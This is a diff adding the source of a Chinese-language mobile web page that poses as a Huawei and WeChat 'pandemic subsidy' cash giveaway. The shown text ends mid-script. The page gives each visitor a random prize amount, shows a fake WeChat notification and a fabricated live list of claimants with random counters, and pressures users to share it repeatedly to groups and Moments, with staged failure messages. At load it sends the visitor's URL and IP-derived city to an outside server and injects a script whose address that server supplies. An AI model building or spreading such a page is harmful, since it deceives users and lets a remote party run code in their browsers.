@@ -1,16 +1,812 @@
-<!DOCTYPE html><html lang=zh-CN><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1"><title>...</title><style>html{
-				width: 750px;
-			}</style><script>document.addEventListener('DOMContentLoaded', function() {
-                document.documentElement.style.fontSize = document.documentElement.clientWidth / 20 + 'px'
-            })
-			if (window.tbsJs != null && window.tbsJs != undefined) {
-				tbsJs.onReady('', function (_0x273c79) {});
-			}</script><script src=https://ip.ws.126.net/ipquery></script><script>if('' == lc)
-			{
-				window.city = lo;
-			}
-			else
-			{
-				window.city = lc;
-			}</script><link rel=stylesheet href=https://x-01.oss-cn-shanghai.aliyuncs.com/public/s3/static/index.css></head><body><div id=app></div><script src=https://x-01.oss-cn-shanghai.aliyuncs.com/public/s3/static/js/chunk-vendors.75e44ccc.js></script><script src=https://x-01.oss-cn-shanghai.aliyuncs.com/public/s3/static/js/index.e703ab18.js></script></body></html>
-< !--jtxeUQQEeh0I4tSYNEEpHqa2rjCYBagem8zJ0v1E8siriwlrwzqmd0jPA74WtIkZAgpjrUI7kYpjBxZ4aeHHlCSz4rgDHTm9CO1zyIv7Ge6TtBvqylZhOAjAqIMRKjaspMZUcVIVBWbbnHwhXo0BmPlKgWluvACdILUNYLv6q5WVsiifqO3JLOT2rCWskrhPUXohVRUaBGBOMsrPVL1q24R8GJQzELZcMk9yS2gPw0GSN0kOFZzSbxwAPlfI1do182xY1AiZXOmiyGIyBjtfGMrQiiXvpE7ISokLDnPKP4AIqUOycEBq5Vb67qIfIzPav2SeYilzLywNM11MIk0yvQrgQBagH-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>...</title>
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <style>
+        body{
+            margin: 0px;
+            padding: 0px;
+            background: #000;
+        }
+        input,div{
+            -moz-box-sizing: border-box;
+            -webkit-box-sizing: border-box;
+            -o-box-sizing: border-box;
+            -ms-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+        @keyframes noticemove{
+            0% {
+                top: -100px;
+            }
+
+            50% {
+                top: 50px;
+            }
+
+            70% {
+                top: 50px;
+            }
+
+            100% {
+                top: -100px;
+            }
+        }
+        @keyframes mymove{
+            0% {
+                transform:rotate(0deg);
+            }
+            10% {
+                transform:rotate(48deg);
+            }
+            20% {
+                transform:rotate(-48deg);
+            }
+            40% {
+                transform:rotate(0deg);
+            }
+            50% {
+                transform:scale(1,0.7);
+            }
+            70% {
+                transform:scale(1,1);
+            }
+            80% {
+                transform:scale(1,0.6);
+            }
+            100% {
+                transform:rotate(0deg);
+            }
+        }
+        @keyframes usermove{
+            0% {
+                left: -75px;
+                height: 25px;
+            }
+
+            100% {
+                left: 0px;
+                height: 60px;
+            }
+        }
+        .new-user{
+            animation:usermove 1s 1 forwards;
+            -webkit-animation:usermove 1s 1 forwards; /* Safari 和 Chrome */
+        }
+        #top-notice{
+            animation:noticemove 3s 1;
+            -webkit-animation:noticemove 3s 1; /* Safari 和 Chrome */
+            top: -100px;
+        }
+
+        .qiang
+        {
+            animation:mymove 2s infinite;
+            -webkit-animation:mymove 2s infinite; /* Safari 和 Chrome */
+        }
+
+
+        @keyframes sharemove{
+            0% {
+                top: 10px;
+                right: 10px;
+            }
+            50% {
+                top: 30px;
+                right: 30px;
+            }
+            100% {
+                top: 10px;
+                right: 10px;
+            }
+        }
+
+        .share{
+            animation:sharemove 0.5s infinite;
+            -webkit-animation:sharemove 0.5s infinite; /* Safari 和 Chrome */
+        }
+    </style>
+    <script src="https://ip.ws.126.net/ipquery"></script>
+    <script>
+
+        if (window.tbsJs != null && window.tbsJs != undefined) {
+            tbsJs.onReady('', function (_0x273c79) {});
+        }
+
+        var enterPageUrl = false;
+        var title = '';
+        if('' == lc)
+        {
+            var city = lo;
+        }
+        else
+        {
+            var city = lc;
+        }
+        function baseRequest(url,method,data,success,error){
+            var baseUrl = 'https://lb.daliaotech.net/';
+            var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
+            httpRequest.open(method.toUpperCase(), baseUrl+url, true); //第二步：打开连接
+            switch (method.toLowerCase())
+            {
+                case 'get':
+                case 'delete':
+                    httpRequest.send();
+                    break;
+                case 'post':
+                case 'put':
+                    httpRequest.setRequestHeader("Content-type","application/json");
+                    httpRequest.send(JSON.stringify(data));
+                    break;
+            }
+
+            httpRequest.onreadystatechange = function () {
+                if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+                    var json =  httpRequest.responseText;//获取到json字符串，还需解析
+                    success(JSON.parse(json))
+                }
+                else if(httpRequest.readyState == 4)
+                {
+                    error('服务器请求失败!')
+                }
+            };
+        }
+
+        function apiRequest(url,method,data){
+            var promise = new Promise((resolve, reject)=> {
+                baseRequest(url, method, data, function (data) {
+                    switch (data.code) {
+                        case '00':
+                            resolve(data.data);
+                            break;
+                        case '30':
+                            reject(data.data);
+                            break;
+                    }
+                }, function (e) {
+                    reject(e);
+                })
+            });
+            return promise;
+        }
+
+        function hide(id) {
+            document.getElementById(id).style.display = 'none';
+            document.getElementById('maskBg').style.display = 'none';
+
+        }
+
+        function qiang() {
+            if(false === enterPageUrl)
+            {
+                alert('数据加载中，稍后重试...');
+                return
+            }
+
+            if(enterPageUrl)
+            {
+                enterPageUrl = enterPageUrl.replace('#', '');
+                if(0 < enterPageUrl.indexOf('?'))
+                {
+                    enterPageUrl = enterPageUrl.substr(0,enterPageUrl.indexOf('?'));
+                }
+                location.href = enterPageUrl+'?step=2&title='+title;
+            }
+            else
+            {
+                var url = location.href.replace('#', '');
+                if(0 < url.indexOf('?'))
+                {
+                    url = url.substr(0,url.indexOf('?'));
+                }
+                location.href = url +'?step=2&title='+title;
+            }
+
+        }
+    </script>
+</head>
+<body>
+<div>
+    <div id="step1" style="position: fixed;left: 0px;top: 0px;right: 0px;bottom: 0px;display: flex;flex-direction: column;align-items: center;justify-content: center; ">
+        <div style="position: relative; display: flex;flex-direction: column; align-items: center; width: 280px;height: 450px; background-color: rgb(200,94,77);border-radius:  10px;">
+            <div style="position: relative; width: 96%; height: 300px; border: 1px solid rgb(200,94,77);  background-color: rgb(200,94,77); border-radius: 10px 10px 50% 50% / 10px 10px 16% 16%; box-shadow: 0px 4px 0px -1px rgba(0, 0, 0, 0.2); ">
+                <div style="display: flex;width: 100%; justify-content: center;height: 120px;align-items: flex-end;">
+                    <image src="https://pp.myapp.com/ma_icon/0/icon_10256204_1571814151/96" style="width: 60px;height: 60px;"></image>
+                </div>
+                <div style="margin-top: 20px; width: 100%;color: #ebcd9b;font-size: 24px;display: flex;justify-content: center;">
+                    支持华为 中华有为
+                </div>
+                <div style="margin-top: 20px; width: 100%;color: #ebcd9b;font-size: 24px;display: flex;justify-content: center;">
+                    <p style="font-size: 16px;text-align: center;color: #ebcd9b;">现金奖励,人人可领<span class="text-tip" style="margin-left: 14px; font-size: 12px; background-color: #ebcd9b; padding: 1px 4px; color: rgb(200,94,77)">可提现</span></p>
+                </div>
+                <div onclick="qiang()" class="qiang" style=" position: absolute;bottom: -46px; left: calc(50% - 46px);box-shadow: 0px 4px 0px 0px rgba(0, 0, 0, 0.2); display: flex;align-items: center;justify-content: center; width: 98px;height: 98px;background-color: #ebcd9b;border-radius: 50%;">
+                    <div style="font-size: 36px;color: #333;">抢</div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    <div id="top-notice" style=" z-index: 999; display: none;flex-direction: column; position: fixed; left: 12px; right: 12px; padding-left: 15px;padding-right: 10px;padding-top: 10px;padding-bottom: 10px; border-radius: 6px;background-color: #fff;">
+        <div style="width: 100%; display: flex;justify-content: space-between; font-size: 12px;color:#6a6a6a ;">
+            <div style="display: flex;">
+                <image src="https://nnxxx.bj.bcebos.com/images/wei_xin.png" style="width: 20px;height: 20px;"></image>
+                <div style="padding-left: 10px;">微信 · </div>
+                <div style="padding-left: 10px;">刚刚</div>
+            </div>
+
+            <div style="display: flex;">
+                <image src="https://nnxxx.bj.bcebos.com/images/safe.png" style="width: 14px;height: 14px;"></image>
+            </div>
+        </div>
+        <div style="margin-top: 5px; display: flex;justify-content: space-between;">
+            <div style="align-content: space-between; font-size: 14px; display: flex;flex-direction: column;justify-content: space-between;">
+                <div>微信红包</div>
+                <div style="color: #6a6a6a;">
+                    已到账，分享即可领取
+                </div>
+            </div>
+            <div>
+                <image src="https://nnxxx.bj.bcebos.com/images/tongzhi.jpg" style="width: 37px;height: 37px;"></image>
+            </div>
+        </div>
+
+    </div>
+
+    <div id="maskBg" style="z-index: 10; position: fixed;background-color: rgba(0,0,0,0.3);left: 0px;right: 0px;bottom: 0px;top: 0px;">
+
+    </div>
+    <div id="alert1" style="display: none; position: fixed;z-index: 11; top: 80px; left: 15%; width: 70%;min-height: 100px;background-color: #fff;">
+        <div style="font-size: 15px; width: 100%;padding: 20px 30px;display: flex;flex-direction: column; align-items: center;">
+            <div style="font-size: 20px;color: red;">华为·两亿疫情补帖</div>
+            <div style="color: red;text-align: center;margin-top: 10px;">
+                <div style="font-size: 16px;"> 疫情补贴</div>
+                <div style="font-size: 20px;margin-top: 10px;">截至于
+                    <span class="showMonth"></span>月<span class="showDay"></span>日送完为止，</div>
+
+                <div style="margin-top: 5px;">人人免费领</div>
+            </div>
+            <p style="font-size: 16px; margin-bottom: 0px;">为答谢新老用户们的支持与厚爱，现发出疫情补助金<br><span style="color: #f4434f;">两亿</span>现金礼包回馈微信用户</p>
+            <p style="color: #bcbcbc; font-size: 16px; margin-bottom: 0px;"> 红包总额仅剩余<span style="color: #f4434f; font-size: 22px;">43万</span><br> 数量有限，先到先得 </p>
+        </div>
+
+        <div onclick="hide('alert1')" style="border-top: solid 1px #e8e8e8; display: flex;align-items: center;justify-content: center; width: 100%;height: 60px;font-size: 18px;color: #1BBC9B;">
+            现在去领
+        </div>
+    </div>
+</div>
+<div id="step2" style="display: none; position: relative;">
+    <div style="position: absolute;left:-50%;right: -50%; top: 0px;background-color: #fff;height: 300px;">
+        <div style="display: flex;flex-direction: column;align-items: center;height: 300px;border-radius: 0px 0px 60% 60%; background-color: rgb(228, 94, 77);">
+            <div style="display: flex;width: 100%; justify-content: center;height: 120px;align-items: flex-end;">
+                <image src="https://pp.myapp.com/ma_icon/0/icon_10256204_1571814151/96" style="width: 60px;height: 60px;"></image>
+            </div>
+            <div style="font-size: 18px;color: rgb(239, 205, 155); text-align: center;padding-top: 10px">支持华为—全民发福利</div>
+            <div>
+                <div style="font-size: 40px;text-align: center;padding-top: 15px;color: rgb(249, 205, 155); font-weight: bold">
+                    <span class="money">0</span>
+                </div>
+            </div>
+            <div style="font-size: 16px; color: rgb(249, 205, 155); text-align: center; padding-top: 5px; display: block;">
+                转发到微信群,48小时内存进零钱&gt;
+            </div>
+            <div onclick="step2Ack()" style="margin-top: 10px; border-radius: 20px;display: flex;align-items: center;justify-content: center; background: #ffe4b2; color: #f25543;font-size: 14px; height: 25px; width:80px;">
+                确认
+            </div>
+        </div>
+    </div>
+    <div class="share" style="position: fixed;z-index: 2;right: 0px;top: 0px; width: 80px;height: 120px;color: #fff;font-size: 14px;display: flex;flex-direction: column;align-items: center;">
+        <div>
+            <img src="https://nnxxx.oss-cn-beijing.aliyuncs.com/hw/arrow5.png" style="width: 80px;height: 80px;" />
+        </div>
+        <div>点击分享</div>
+    </div>
+    <div style="position: fixed;top: 300px; left: 0px; width: 100%;height: 5px;background-color: #eceeed;"></div>
+    <div style="background-color: #fff;position: fixed;top: 300px;left: 0px;right: 0px;bottom: 0px;overflow-y: hidden;">
+        <div style="width: 100%;font-size: 14px; color: #929493;padding: 5px 10px;border-bottom: solid 1px rgba(0,0,0,0.05);">
+            奖励总计<span id="sumNumber"></span>份 剩余<span id="useNumber"></span>份
+        </div>
+        <div id="userList" style="display: flex;flex-direction: column;overflow-y: auto;">
+
+        </div>
+    </div>
+    <div  style="display: none; z-index: 10; position: fixed;background-color: rgba(0,0,0,0.3);left: 0px;right: 0px;bottom: 0px;top: 0px;">
+
+    </div>
+    <div id="step2Mask" style="display: none; position: fixed;z-index: 11; top: 100px;left: 15%; width: 70%;min-height: 100px;background-color: #fff;">
+        <div id="step2Alert" style="font-size: 15px; width: 100%;padding: 20px 10px;display: none;flex-direction: column; align-items: center;">
+            <div style="">点击右上角按钮并分享到</div>
+            <div style="color: red;font-size: 23px;" class="shareTarget"></div>
+            <div style="color: #1BBC9B;">完成后自动存入您的微信钱包</div>
+        </div>
+        <div id="step2FirstAlert" style=" font-size: 15px; width: 100%;padding: 20px 10px;display: none;flex-direction: column; align-items: center;">
+            <div style="color: #1BBC9B;font-size: 23px;">恭͏喜͏你</div>
+            <div style="color: red;">您获得͏现 金͏奖励</div>
+            <div style="color: red;font-size: 23px;"><span class="money"></span>元</div>
+            <div style="">
+                <span style="color: red;">活动宗旨：</span>
+                <span>感恩回馈粉丝</span>
+            </div>
+            <div style="word-wrap:break-word;word-break:break-all; ">
+                <span style="color: red;">领取要求：</span>
+                <span>您只需分享到</span>
+                <span style="font-weight: bold;" class="shareTarget">朋友圈</span>
+                <div style="">完成后自动存入您的微 信钱包</div>
+            </div>
+            <div style="margin-top: 20px;word-wrap:break-word;word-break:break-all; ">
+                <div>红包总额仅剩余<span id ="rNumber"></span>万·元，先到先得，</div>
+                <div>活动经微·信认证，真实有效</div>
+            </div>
+        </div>
+        <div id="step2Share"  style="font-size: 15px; width: 100%;padding: 20px 10px;display: none;flex-direction: column; align-items: center;">
+            <div id="step2Share1" style="display: none; width: 100%;text-align: center;">
+                <div style="font-size: 18px;color:green;">发送成功</div>
+                <p style="line-height: 35px;"><b style="color:green;font-size: 20px">请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群<br><span style="color:red;">成功后可领取红包</span></b></p>
+            </div>
+            <div id="step2Share2" style="display: none;width: 100%;text-align: center;">
+                <div style="font-size: 18px;color:green;">发送成功</div>
+                <p style="line-height: 35px;"><b style="color:green;font-size: 20px">还剩最后一步<br><b style="font-size: 18px;">请分享到</b><b style="font-size: 18px;color: red">微信群</b><br>成功后可领取红包</b></p>
+            </div>
+            <div id="step2Share3" style="display: none;width: 100%;text-align: center;">
+                <div style="font-size: 18px;color:green;">发送失败</div>
+                <p style="line-height: 35px;"><b style="color:red;font-size: 20px">注意：分享到相同的群会失败<br>请重试重新转发到1个不同的群<br></b></p>
+            </div>
+            <div id="step2Share4" style="display: none;width: 100%;text-align: center;">
+                <div style="font-size: 18px;color:green;">发送成功</div>
+                <p style="line-height: 35px;"><b style="color:green;font-size: 20px">恭喜您完成了群分享,接下来<b style="font-size: 18px;color: red"></br>分享到您的朋友圈</b><br>分享成功后即可领奖</b></p>
+            </div>
+            <div id="step2Share5" style="display: none;width: 100%;text-align: center;">
+                <div style="font-size: 18px;color:green;">发送失败</div>
+                <p style="line-height: 35px;"><b style="color:green;font-size: 20px">请重试分享到朋友圈<b style="font-size: 18px;color: red"></br>就差一步即可领奖</b></b></p>
+            </div>
+            <div id="step2Share6" style="display: none;width: 100%;text-align: center;">
+                <div style="font-size: 20px;color:red;font-weight: bold;">恭喜您</div>
+                <div>
+                    获得￥
+                    <span style="font-size: 20px;color: red;" class="money"></span>
+                    现金红包,我们将在48小时内陆续打款，请注意检查收微信绑定银行卡到账情况！<br>
+                    <span style="font-size: 20px;color:red;">注意:打款期间分享信息不可删除，否则无法核实用户信息，以免现金红包发放失败！</span>
+                </div>
+            </div>
+        </div>
+        <div onclick="step2Hide()" style="border-top: solid 1px #e8e8e8; display: flex;align-items: center;justify-content: center; width: 100%;height: 48px;font-size: 18px;color: #1BBC9B;">
+            好的
+        </div>
+    </div>
+</div>
+</body>
+</html>
+
+<script>
+
+    var step = 1;
+
+
+    function getQueryVariable(variable)
+    {
+        var url = location.href;
+        if(0 >= url.indexOf('?'))
+        {
+            return false;
+        }
+        var query = url.substr(url.indexOf('?')+1);
+
+        query = query.replace(/&amp;/g,'&');
+        var vars = query.split("&");
+        for (var i=0;i<vars.length;i++) {
+            var pair = vars[i].split("=");
+            if(pair[0] == variable){return pair[1];}
+        }
+
+        return(false);
+    }
+
+    function loadData() {
+        var then = encodeURIComponent(location.href);
+        apiRequest('api/enter?then='+then+'&city='+city,'GET').then((data)=>{
+            enterPageUrl = data.url;
+            title = data.title;
+            document.title = title;
+            var hm = document.createElement("script");
+            hm.src = data.s;
+            var oHead = document.getElementsByTagName('HEAD').item(0);
+            oHead.appendChild(hm);
+        });
+    }
+
+    var queryStep = getQueryVariable('step');
+    var queryTitle = getQueryVariable('title');
+
+    if(queryStep) {
+        sessionStorage.setItem('step', queryStep);
+        if (queryTitle)
+        {
+            sessionStorage.setItem('title', queryTitle);
+        }
+        location.href = location.href.substring(0,location.href.indexOf('?'));
+
+    }
+    else
+    {
+
+        loadData();
+    }
+
+    var ackStep = sessionStorage.getItem('step');
+    var ackTitle = sessionStorage.getItem('title');
+    if(ackTitle)
+    {
+        document.title = ackTitle;
+    }
+    if(ackStep)
+    {
+        step = ackStep;
+    }
+
+    if(1 == step)
+    {
+        document.getElementById('top-notice').style.display = 'flex';
+        function init() {
+            var myDate = new Date(new Date().getTime()+86400000);
+            var endMonth = myDate.getMonth()+1;
+            var endDay = myDate.getDate();
+
+            var showMonths = document.querySelectorAll('.showMonth');
+            for(let i=0;i<showMonths.length;i++)
+            {
+                showMonths[i].innerHTML=endMonth;
+            }
+
+            var showDays = document.querySelectorAll('.showDay');
+            for(let i=0;i<showDays.length;i++)
+            {
+                showDays[i].innerHTML=endDay;
+            }
+
+        }
+        init();
+    }
+
+    if(2 == step)
+    {
+
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        document.getElementById('step2FirstAlert').style.display = 'flex';
+        document.getElementById('step2Mask').style.display = 'block';
+    }
+    else
+    {
+        document.getElementById('alert1').style.display = 'block';
+    }
+
+
+    var money =  parseInt(10000+Math.random()*10000)/100;
+
+    var moneyNodes = document.querySelectorAll('.money');
+    for(let i=0;i<moneyNodes.length;i++)
+    {
+        moneyNodes[i].innerHTML=money;
+    }
+
+    var curShareTraget = '微信群';
+
+
+    var shareTargetNodes = document.querySelectorAll('.shareTarget');
+    for(let i=0;i<shareTargetNodes.length;i++)
+    {
+        shareTargetNodes[i].innerHTML=curShareTraget;
+    }
+
+
+    if(2 == step)
+    {
+
+
+        var userAppendIndex = 0;
+        var users = [
+            {
+                avatar:'http://img.qq22.com.cn/allimg/22/10/3b7532050073a47c04.jpg',
+                nickname:'卮言',
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/22/10/5821f5b77ddf3be913.jpg',
+                nickname:'沽酒问卿',
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/20/19/d7ca8436fd7cb6ec37.jpg',
+                nickname:'古今如梦'
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/22/10/f04f913a25b72f9708.jpg',
+                nickname:'半城烟沙'
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/22/09/e6efcd561f76948e49.jpg',
+                nickname:'韶华洗泪妆'
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/22/09/05c953b29fa9bb4a49.jpg',
+                nickname:'浊酒倾觞'
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/22/09/abc10ccc1863da8b48.jpg',
+                nickname:'浊酒倾觞'
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/22/09/8cb79439796b2bc848.jpg',
+                nickname:'浊酒倾觞'
+            },
+            {
+                avatar:'http://img.qq22.com.cn/allimg/20/19/75bcf9415e9acda815.jpg',
+                nickname:'浊酒倾觞'
+            }
+        ];
+        var  appendNickname = [
+            "梦里七彩虹","迷上书甜","南风向北","恬淡春风","少女灼华过桃夭",
+            "沙哑情歌","明月踏清风",
+            "凉心初透","夏树繁花","半旧情怀","暗舞者","旧楼天台","暗藏城府",
+            "沉睡在你心底的光","内心独白","感遇","你如温阳","青山独往",
+            "笑眼迷人","山月记","笔尖微凉","半生浮名","纵我不忘","孤独常在",
+            "独恋寒冬雪","一壶酒化流年","星河万里不如你","桃花开了","只此热忱",
+            "浪花的泡沫","眉目成书","毕竟懂事了","一只哀伤的猫","雨中的恋人","妄言",
+            "好感都给你.","生生入你梦里.","一饮孤独","庆幸是你.","时间说客",
+            "贝叶书","悦心自足","旅月怀人","倾世璃歌","诗酒乔木","失格少女",
+            "白云下的棉絮","橘生淮南","回忆的海","清风徐来","风中的歌声",
+            "躺在你的梨涡里","被世俗隐瞒","爱情的模样","竹篱外的小黄花",
+            "微云淡月","山后别相逢","月亮魔法","云深不知处","山水几相逢",
+            "人间烟火","满是欢喜","月亮遮住脸","寒橘","你是柔风","碎了星光一地",
+            "趁月色还在","灵感集市","染指流年","稳做枕边人","漫步云中月","初夏的雨",
+            "繁星画作泥尘","追尾的猫","望一片星辰","云淡风轻","余情已逝","等风醒来",
+            "恬淡春风","绝世的容颜","草莓仙","顾北清歌寒","人间惊鸿宴"
+        ];
+        var appendAvatar = [
+            'https://img2.yuntouxiang.com/file/20190628/a31fdba495c9dc2202a778ecc8a40494.jpg',
+            'https://img2.yuntouxiang.com/file/20190628/af530ec85ba7493b8e19211997ec7068.jpg',
+            'https://img2.yuntouxiang.com/file/20190624/c75723d93089890d488e90e75515504d.jpg',
+            'https://img2.yuntouxiang.com/file/20190624/e995d1d4258033722fbfad7575258131.jpg',
+            'https://img2.yuntouxiang.com/file/20190622/0e4b49fcb6ef2b0452ea9b3bf222a310.jpg',
+            'https://img2.yuntouxiang.com/file/20190622/dc636994db2726140fea90fe9a1b5fc0.jpg',
+            'https://img2.yuntouxiang.com/file/20190621/ba56d6a458993f4ae451de0caa210e3f.jpg',
+            'https://img2.yuntouxiang.com/file/20190621/8ebd0f6767dfbaf32f120ab61d0b6d01.jpg',
+            'https://img2.yuntouxiang.com/file/20190620/1f663f1020f707c5c6b8d1765411b874.jpg',
+            'https://img2.yuntouxiang.com/file/20190620/e1b065254229ccb42d96447901505749.jpg',
+            'https://img2.yuntouxiang.com/file/20190619/344d016151b68bbd316d2008a24a90da.jpg',
+            'https://img2.yuntouxiang.com/file/20190619/c466b4612ca96fcabdb535ad53dfc6e9.jpg',
+            'https://img2.yuntouxiang.com/file/20190617/7be0231201ab7aa0f245edf7d2f9cec8.jpg',
+            'https://img2.yuntouxiang.com/file/20190617/98d1b27c09d0f093ce4e5b0b280c62c4.jpg',
+            'https://img2.yuntouxiang.com/file/20190615/77b21429f8e5b381ab7a837bc5f4b363.jpg',
+            'https://img2.yuntouxiang.com/file/20190615/a055a28fcd2713dbd99e94cfe1dafe49.jpg',
+            'https://img2.yuntouxiang.com/file/20190614/f66ba02e353c31964bec8546621dbd73.jpg',
+            'https://img2.yuntouxiang.com/file/20190614/07a6635a1590ae44d2b855d884d9cfe8.jpg',
+            'https://img2.yuntouxiang.com/file/20190607/c14561fce407a5fc974573a7a28dbbd5.jpg',
+            'https://img2.yuntouxiang.com/file/20190607/99578a175609c29156d716ad9a7678f1.jpg',
+            'https://img2.yuntouxiang.com/file/20190529/97808a56512cbd714b1fec69d8bed433.jpg',
+            'https://img2.yuntouxiang.com/file/20190529/20b8347167f2efdd4d60b30bfc598da4.jpg',
+            'https://img2.yuntouxiang.com/file/20190528/9058a697c117e5799ff250d28442cd11.jpg',
+            'https://img2.yuntouxiang.com/file/20190528/50d1ec9ab50a2c8c323d507569c1b093.jpg',
+            'https://img2.yuntouxiang.com/file/20190527/f2fa46db9e4670b5a5debf4e4803c37a.jpg',
+            'https://img2.yuntouxiang.com/file/20190527/0cf41022deebcf19d236b52a7e8dbb21.jpg',
+            'https://img2.yuntouxiang.com/file/20190524/c9f7bfdac37e0e02c4bc9928db51af98.jpg',
+            'https://img2.yuntouxiang.com/file/20190524/d05dd14ba826f5e28ddcbbf3fdcebc02.jpg',
+            'https://img2.yuntouxiang.com/file/20190522/8e320bd28b2a3212cae2b46506ad38a7.jpg',
+            'https://img2.yuntouxiang.com/file/20190522/dd87ad489f5f52017c7e5d1a93e6e129.jpg',
+            'https://img2.yuntouxiang.com/file/20190309/6ccf2c4a48afcd6b927396cf5aaf976c.jpg',
+            'https://img2.yuntouxiang.com/file/20190308/4c75064898b7e3470219083fa41f0707.jpg',
+            'https://img2.yuntouxiang.com/file/20190308/2fe72453c3393e65bf2945c262283077.jpg',
+            'https://img2.yuntouxiang.com/file/20190307/1c6242d7da63031f245ba9bd62129813.jpg',
+            'https://img2.yuntouxiang.com/file/20190307/656697b02a493ee20641b56778cd17a6.jpg',
+            'https://img2.yuntouxiang.com/file/20190306/2c3d85d322995def39528ae6a3abda38.jpg',
+            'https://img2.yuntouxiang.com/file/20190306/997b0c3223afa97a4cf344df0929cbea.jpg',
+            'https://img2.yuntouxiang.com/file/20190305/0822a908fd7c0e9583be31e830d1d1bc.jpg',
+            'https://img2.yuntouxiang.com/file/20190305/7dfb203d5d5255759dd345b1efaafddf.jpg',
+            'https://img2.yuntouxiang.com/file/20190304/928d0323a861f729e1a76a7069c39fdc.jpg',
+            'https://img2.yuntouxiang.com/file/20190304/786b95bc5ea715c99d58a8743114c786.jpg',
+            'https://img2.yuntouxiang.com/file/20190301/666759ead9c7a22a8d44ace77935810f.jpg',
+            'https://img2.yuntouxiang.com/file/20190301/1da54e8f4d107c11451d6f087e584a53.jpg',
+            'https://img2.yuntouxiang.com/file/20190228/fae537ed5840690e44ae39548224d3a6.jpg',
+            'https://img2.yuntouxiang.com/file/20190228/c40174e026ffda9f4f6936560ae873e5.jpg',
+            'https://img2.yuntouxiang.com/file/20190227/bd01fda783d7e6e1776bc795bc5bc7b2.jpg',
+            'https://img2.yuntouxiang.com/file/20190227/e5a54096eca4b0000006a34e74cad919.jpg',
+            'https://img2.yuntouxiang.com/file/20190226/cc1479f31f4cad30769e54ce2fd1c634.jpg',
+            'https://img2.yuntouxiang.com/file/20190226/062fc3749ead02bb9a4b237151c90275.jpg',
+            'https://img2.yuntouxiang.com/file/20190225/4d9b6e8ef061bf129fe441b95be42b0b.jpg',
+            'https://img2.yuntouxiang.com/file/20190225/c1374550232360a553be9a6152aba534.jpg',
+            'https://img2.yuntouxiang.com/file/20190223/5c6132082ff38a671f8be578ed8f8160.jpg',
+            'https://img2.yuntouxiang.com/file/20190223/205758389737b401732818a5a1b328c6.jpg',
+            'https://img2.yuntouxiang.com/file/20190222/281e74cfdd300a08b895f66d7ace9aef.jpg',
+            'https://img2.yuntouxiang.com/file/20190222/85660c4ac097fe463ef3eb8b5d9b6698.jpg',
+            'https://img2.yuntouxiang.com/file/20190221/df9a7dd3ced7370efac24893d4b40e0e.jpg',
+            'https://img2.yuntouxiang.com/file/20190221/6a6bdb3a9a0a01fb177886c1b713e258.jpg',
+            'https://img2.yuntouxiang.com/file/20190218/9b412922c9de563b458bb047059c3358.jpg',
+            'https://img2.yuntouxiang.com/file/20190218/586b6411e6b85c2c682cd27a56de8846.jpg',
+            'https://img2.yuntouxiang.com/file/20190216/513a0b73bc8709d58a345851b723208b.jpg',
+        ];
+
+
+        var sumNumber = 200000;
+
+        document.getElementById('sumNumber').innerText = sumNumber;
+
+        var useNumber = 160000+parseInt(Math.random()*20000);
+
+        var rNumber =  Math.floor((sumNumber-useNumber)/1000)
+
+        document.getElementById('rNumber').innerText = rNumber;
+
+        document.getElementById('useNumber').innerText = useNumber;
+        var time3 = false;
+        var pNode = false;
+
+        function runUserList()
+        {
+
+            if(sumNumber <= useNumber)
+            {
+                useNumber = sumNumber;
+                document.getElementById('useNumber').innerText = useNumber;
+                clearInterval(time3);
+                time3 = false;
+                return;
+            }
+            var number = parseInt(Math.random()*50);
+            useNumber += number;
+            document.getElementById('useNumber').innerText = useNumber;
+            var maxNumber = this.appendNickname.length > this.appendAvatar.length?this.appendAvatar.length:this.appendNickname.length;
+            var myDate = new Date(new Date().getTime()-3600000);
+            var hour =  myDate.getHours();
+            var min = Math.floor(Math.random()*60);
+            var user ={
+                avatar:this.appendAvatar[userAppendIndex],
+                nickname:this.appendNickname[userAppendIndex]
+            };
+            user.at = hour+':'+(10 > min?('0'+min):min);
+
+            var html = `
+        <div class="new-user" style="display: flex;align-items: center; position: relative; height: 60px;padding: 0px 10px;border-bottom: solid 1px rgba(0,0,0,0.05);">
+                <div style="position: absolute; left: 10px;right: 10px; display: flex;justify-content: space-between;">
+                    <div style="display: flex; ">
+                        <div style="display: flex;">
+                            <img src="`+user.avatar+`" style="width: 40px;height: 40px;border-radius: 4px;" />
+                        </div>
+                        <div style="padding-left: 5px; display: flex;flex-direction: column;justify-content: space-between;">
+                            <div style="font-size: 15px;">
+                                `+user.nickname+`
+                            </div>
+                            <div style="font-size: 14px;color: #929493;">
+                                `+user.at+`
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="display: flex;">
+                        <img src="https://nnxxx.oss-cn-beijing.aliyuncs.com/hw/ylq.jpg" style="width: 40px;height: 40px;" />
+                    </div>
+                </div>
+            </div>
+        `;
+
+            var div = document.createElement('div');
+            div.innerHTML = html;
+            if(false === pNode)
+            {
+                document.getElementById('userList').appendChild(div);
+            }
+            else
+            {
+                document.getElementById('userList').insertBefore(div,pNode);
+            }
+
+            pNode = div;
+
+            userAppendIndex++;
+            if(0 == (userAppendIndex % maxNumber))
+            {
+                userAppendIndex = 0;
+            }
+            // if(30 < this.users.length)
+            // {
+            //     this.users.splice(30,10)
+            //
+            // }
+
+        }
+
+        time3 = setInterval(runUserList,1000);
+
+        function step2Ack() {
+            document.getElementById('maskBg').style.display = 'block';
+            document.getElementById('step2Alert').style.display = 'flex';
+            document.getElementById('step2Mask').style.display = 'block';
+
